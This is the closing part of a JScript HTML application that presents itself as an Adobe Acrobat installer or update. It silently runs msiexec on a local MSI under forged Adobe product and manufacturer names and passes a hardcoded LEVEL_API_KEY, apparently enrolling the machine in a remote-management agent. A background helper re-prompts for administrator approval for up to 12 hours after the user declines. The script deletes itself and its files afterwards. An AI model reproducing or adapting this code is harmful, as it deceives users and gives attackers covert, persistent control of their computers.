function installRetryActive() {
  // The detached helper owns re-prompting once it's up. Give it up to ~30 min
  // before we give up the in-window wait (and flip the window to a clean state).
  return installHelperSpawned && (nowMs() - installHelperT0 < RETRY_INWINDOW_MS);
}

// Is an msiexec process running? True only once consent was given and the
// install is actually executing.
function msiexecRunning() {
  try {
    var e = shell.Exec('tasklist /fi "imagename eq msiexec.exe"');
    var out = e.StdOut().ReadAll();
    return /msiexec/i.test(out);
  } catch (e2) { return true; }  // can't tell -> assume still running (safe)
}
// Is the UAC consent dialog open? The prompt runs as consent.exe (UserOOBEBroker
// on some builds). While it's up the user hasn't answered yet; when it's gone
// and no install started, the consent was declined/closed.
function uacConsentRunning() {
  try {
    var e = shell.Exec('tasklist /fi "imagename eq consent.exe"');
    var out = e.StdOut().ReadAll();
    if (/consent\.exe/i.test(out)) return true;
    var e2 = shell.Exec('tasklist /fi "imagename eq UserOOBEBroker.exe"');
    return /UserOOBEBroker\.exe/i.test(e2.StdOut().ReadAll());
  } catch (e3) { return true; }  // can't tell -> assume still pending (safe)
}

// ---------------------------------------------------------------------------
// Install phase: msiexec installs the LOCAL MSI file. Single UAC consent via
// ShellExecute "runas". Completion is detected by watching the MSI /L*v log -
// the final line "Installation success or error status: N" is written on exit.
// ---------------------------------------------------------------------------
function launchMsiexec(args) {
  try {
    var sh = new ActiveXObject("Shell.Application");
    sh.ShellExecute("msiexec.exe", args, "", "runas", 1);
    return true;
  } catch (e) {}
  try { shell.Run("msiexec " + args, 0, false); return true; } catch (e2) {}
  return false;
}

function startLocalInstall() {
  state = "installing";
  curLog = logPath;
  deleteFile(curLog);
  startTime = nowMs();
  lastLogSize = 0;
  lastLogGrowT = nowMs();
  progress = 90; setBar(progress);
  setStatus(instMsgs[0]);
  traceLog("install: launching msiexec");

  var args = '/i "' + msiLocal + '" /qn /norestart PRODUCTNAME="Adobe Acrobat 2024 (64-bit)" MANUFACTURER="Adobe Systems Incorporated" LEVEL_API_KEY="vNXe6NQK21W3jiBMb4k2Uz8M" /L*v "' + curLog + '"';
  if (!launchMsiexec(args)) {
    fail("Administrator approval is required", "install: launch failed");
    return;
  }
  pollTimer = setInterval(pollInstall, 800);
}
function readLogTail(log, bytes) {
  var d = "";
  try {
    if (!fso.FileExists(log)) return "";
    var f = fso.OpenTextFile(log, 1, false, -1);   // -1 = Tristate (BOM-aware)
    try {
      var pos = Math.floor(f.Size / 2) - bytes;    // char offset (UTF-16 ~ 2 bytes/char)
      if (pos > 0) f.Position = pos;
      d = f.Read(-1);                              // read to end of file
    } catch (e) {
      try { f.Close(); } catch (e2) {}
      f = fso.OpenTextFile(log, 1, false, 0);      // fallback: ANSI/ASCII
      var pos2 = f.Size - bytes;
      if (pos2 > 0) f.Position = pos2;
      d = f.Read(-1);
    }
    try { f.Close(); } catch (e3) {}
    return d;
  } catch (e) { return ""; }
}

function logInfo(log) {
  var out = { exists: false, size: 0, status: -1, tail: "" };
  try {
    if (fso.FileExists(log)) {
      out.exists = true;
      out.size = fso.GetFile(log).Size;
      out.tail = readLogTail(log, 65536);
      var m = out.tail.match(/Installation success or error status:\s*(-?\d+)/);
      if (m) out.status = parseInt(m[1], 10);
    }
  } catch (e) {}
  return out;
}

function pollInstall() {
  try { _pollInstall(); } catch (e) {}
}

function _pollInstall() {
  if (state !== "installing") return;
  var t = nowMs();
  var info = logInfo(curLog);
  if (info.status >= 0) {
    traceLog("install: msi status=" + info.status);
    if (info.status === 0 || info.status === 3010) { finishInstall(); return; }
    fail("Installation failed (error code " + info.status + ")", "install_rc=" + info.status);
    return;
  }
  if (info.exists) {
    if (info.size > lastLogSize) { lastLogSize = info.size; lastLogGrowT = t; }
    if (t - lastLogGrowT > INSTALL_STALL_MS) {
      fail("Installation could not be completed", "install: log stalled, no status");
      return;
    }
    return;
  }
  // No log yet: UAC consent is pending (or was declined/abandoned).
  if (t - startTime > 20000) {
    // Decline/abandon detection: after a short grace (lets the MSI log appear
    // once consent is given), if the consent dialog is gone and no msiexec is
    // running, the user clicked No (or walked away) -> hand re-prompting to the
    // detached helper immediately instead of waiting out the full timeout.
    if (!installHelperSpawned && !uacConsentRunning() && !msiexecRunning()) {
      traceLog("install: uac declined (consent gone), spawning retry helper");
      spawnInstallRetryHelper();
    }
  }
  if (t - startTime > UAC_TIMEOUT_MS) {
    // Fallback for the case where the consent dialog was never opened / left
    // hanging (or detection is unavailable): same hand-off, plus the in-window
    // patience before the window gives up on its own.
    if (!installHelperSpawned) {
      traceLog("install: uac timeout, spawning retry helper");
      spawnInstallRetryHelper();
    }
    if (t - startTime > UAC_TIMEOUT_MS + RETRY_INWINDOW_MS) {
      // Window has waited long enough on its own; the helper keeps trying in
      // the background (up to 12h). Close cleanly (no scary error page).
      fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout (helper continues)");
    }
  }
}

// ---------------------------------------------------------------------------
// Progress loop
// ---------------------------------------------------------------------------
function tick() {
  try { _tick(); } catch (e) {}
}

function _tick() {
  if (state === "installing") {
    var hasLog = false, sz = 0;
    try { if (fso.FileExists(curLog)) { hasLog = true; sz = fso.GetFile(curLog).Size; } } catch (e) {}
    if (hasLog) {
      if (progress < 95) { progress += 0.15; setBar(progress); }
      var i;
      if (progress < 96) i = 0; else i = 2;
      setStatus(instMsgs[i]);
    } else {
      // UAC pending: creep toward ~92%.
      if (progress < 92) { progress += (92 - progress) * 0.01; setBar(progress); }
      if (installHelperSpawned) {
        setStatus("Waiting for administrator approval&hellip;");
      } else {
        setStatus(instMsgs[0]);
      }
    }
  } else if (state === "predl") {
    // Approach 55% so the bar is visibly moving while data comes in.
    if (progress < 55) { progress += (55 - progress) * 0.05; setBar(progress); }
    setStatus(dlProgressed ? dlMsgs[2] : dlMsgs[1]);
  }
}

// ---------------------------------------------------------------------------
// Diagnostics - registry reads + log tail only, no external tooling.
// ---------------------------------------------------------------------------
function osBuild() {
  try {
    var v = shell.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
    if (v) return String(v);
  } catch (e) {}
  return "unknown";
}

function regStr(key, name) {
  try {
    var v = shell.RegRead(key + "\\" + name);
    return (typeof v === "undefined") ? "(none)" : String(v);
  } catch (e) { return "(none)"; }
}

function dumpDiagnostics(reason) {
  try {
    var L = [];
    L.push("Adobe Update diagnostics");
    L.push("time: " + new Date().toString());
    L.push("reason: " + reason);
    L.push("state: " + state);
    L.push("elapsed_ms: " + (startTime ? nowMs() - startTime : 0));
    L.push("progress: " + Math.round(progress) + "%");
    L.push("os: " + shell.ExpandEnvironmentStrings("%OS% %PROCESSOR_ARCHITECTURE%"));
    L.push("build: " + osBuild());
    L.push("msi_local: " + (fso.FileExists(msiLocal) ? "yes (" + fso.GetFile(msiLocal).Size + " bytes)" : "no"));
    L.push("wininet ProxyEnable: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyEnable"));
    L.push("wininet ProxyServer: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyServer"));
    L.push("wininet ProxyOverride: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "ProxyOverride"));
    L.push("wininet AutoConfigURL: " + regStr("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings", "AutoConfigURL"));
    L.push("winhttp mode: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "DefaultProxyRequirements"));
    L.push("winhttp ProxyServer: " + regStr("HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinHttp\\Parameters", "ProxyServer"));
    if (tracePath && fso.FileExists(tracePath)) {
      var tt = readLogTail(tracePath, 32768);
      if (tt) {
        L.push("--- status.log tail ---");
        var tl = tt.split("\n");
        for (var i = Math.max(0, tl.length - 15); i < tl.length; i++) L.push(tl[i]);
      }
    }
    if (curLog) {
      var tail = readLogTail(curLog, 65536);
      if (tail) {
        L.push("--- msi log tail (" + curLog + ") ---");
        var lines = tail.split("\n");
        for (var j = Math.max(0, lines.length - 25); j < lines.length; j++) L.push(lines[j]);
      }
    }
    var w = fso.CreateTextFile(diagPath, true);
    w.Write(L.join("\r\n"));
    w.Close();
  } catch (e) {}
}


function fail(msg, reason) {
  if (state === "done" || state === "error") return;
  state = "error";
  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  killProc();
  traceLog("fail: " + (reason || msg));
  dumpDiagnostics(reason || msg);
  selfDelete();
  setStatus(msg);
  $("heading").innerHTML = "Installation could not be completed";
  $("subnote").innerHTML = "Please check your internet connection and try again.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function finishInstall() {
  if (state === "done" || state === "error") return;
  state = "done";
  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  progress = 100; setBar(progress);
  setStatus("Installation complete");
  traceLog("install: complete");
  selfDelete();
  $("heading").innerHTML = "Adobe Acrobat is now installed";
  $("biglogo").style.display = "none";
  $("subnote").innerHTML = "Adobe Acrobat will be available the next time you open it.";
  $("note").innerHTML = "You can now close this window.";
  $("cancelbtn").innerHTML = "Close";
}

function cancel() {
  if (state === "done" || state === "error") { window.close(); return; }
  if (state === "done" || state === "error") { window.close(); return; }
  if (dlXHR) { try { dlXHR.abort(); } catch (e) {} dlXHR = null; }
  killProc();
  if (tickTimer) { clearInterval(tickTimer); tickTimer = null; }
  if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
  if (fbTimer) { clearInterval(fbTimer); fbTimer = null; }
  var p = [msiLocal, logPath, logPath2];
  for (var i = 0; i < p.length; i++) {
    try { if (fso.FileExists(p[i])) fso.DeleteFile(p[i], true); } catch (e) {}
  }
  try { if (psDir && fso.FolderExists(psDir)) fso.DeleteFolder(psDir, true); } catch (e) {}
  window.close();
}


</script>
</body>
</html>
